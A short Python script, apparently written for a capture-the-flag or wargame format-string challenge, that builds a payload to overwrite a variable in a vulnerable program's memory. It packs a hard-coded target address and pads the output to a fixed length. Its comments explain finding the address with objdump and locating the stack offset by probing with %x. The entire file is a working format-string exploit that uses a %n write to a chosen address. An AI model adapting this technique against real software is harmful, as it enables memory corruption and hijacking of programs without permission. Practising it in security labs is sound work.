import struct

# pad will give you a constant length string so that stack does not vary accroding to input
def pad(string, length):
        return (string[:length] + "." * (length - len(string)))

# address of the target variable
# can be found using objdump
addr = struct.pack("I", 0x080496f4)
# required values at each address
value = 0x01025544

# find the position of addr in the printf parameters passing many %x to printf
exploit = addr + "%"+ str(value-4) +"d" + "%12$n"

print(pad(exploit, 512))
